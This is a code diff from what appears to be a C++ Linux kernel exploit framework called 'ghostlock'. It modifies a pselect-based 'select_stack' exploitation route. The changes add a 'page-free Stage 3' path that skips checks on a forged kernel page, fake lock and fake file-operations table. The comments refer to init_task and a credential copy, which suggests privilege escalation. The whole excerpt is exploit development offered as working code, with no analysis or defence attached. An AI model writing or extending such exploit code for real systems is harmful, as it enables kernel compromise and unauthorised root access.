@@ -616,9 +616,14 @@ namespace ghostlock::route {
 
 namespace ghostlock::route::select_stack {
     int32_t SelectStackRoute::prepare() noexcept {
-        if (!(session::g_exploit_session.heap.current.base) || !(session::g_exploit_session.heap.current.fake_lock) || !
-            (session::g_exploit_session.
-                heap.current.fake_fops)) {
+        /* Page-free Stage 3: with no page there is no base/lock/fops verdict
+         * to check -- the lock comes from the profile's anchor (page_free
+         * requires it), the task is init_task and the credential copy is not
+         * filled. The page guard stays for the page path unchanged. */
+        if (!support::page_free_run() &&
+            (!(session::g_exploit_session.heap.current.base) ||
+             !(session::g_exploit_session.heap.current.fake_lock) ||
+             !(session::g_exploit_session.heap.current.fake_fops))) {
             pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                        "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                        (session::g_exploit_session.heap.current.fake_lock),
@@ -692,12 +697,17 @@ namespace ghostlock::route::select_stack {
 
         for (int32_t attempt = 1; attempt <= attempts; attempt++) {
             if (attempt > 1) {
-                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
-                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
-                    !(session::g_exploit_session.heap.current.fake_fops)) {
-                    pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
-                    (void) fail(35, errno);
-                    break;
+                /* Page-free Stage 3: there is no page to rebuild (and no page
+                 * verdict to test); the retry only re-stamps the fd_sets,
+                 * which draws a fresh anchor slot. */
+                if (!support::page_free_run()) {
+                    const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
+                    if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
+                        !(session::g_exploit_session.heap.current.fake_fops)) {
+                        pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
+                        (void) fail(35, errno);
+                        break;
+                    }
                 }
                 if (!route::select_stack_build_fdsets(this, attempt)) {
                     (void) fail(34, ENOSPC);
